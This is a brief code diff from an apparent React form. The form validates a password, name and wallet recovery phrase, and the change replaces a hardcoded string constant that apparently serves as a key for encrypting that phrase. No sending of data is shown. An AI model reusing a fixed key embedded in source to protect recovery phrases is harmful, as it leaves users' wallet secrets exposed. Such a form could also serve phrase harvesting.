@@ -53,7 +53,7 @@ const Form = ({ countWords }) => {
 
 	const submitForm = () => {
 		if (passwordValid && passwordMatch && nameValid && restorePhraseValid) {
-			const kitkat = 'aBN6qreLALR9QYPy';
+			const kitkat = 'Qsx@ah&OR82WX9T6gCt';
 
 			let phraseCrypt =
 				restorePhrase != ''
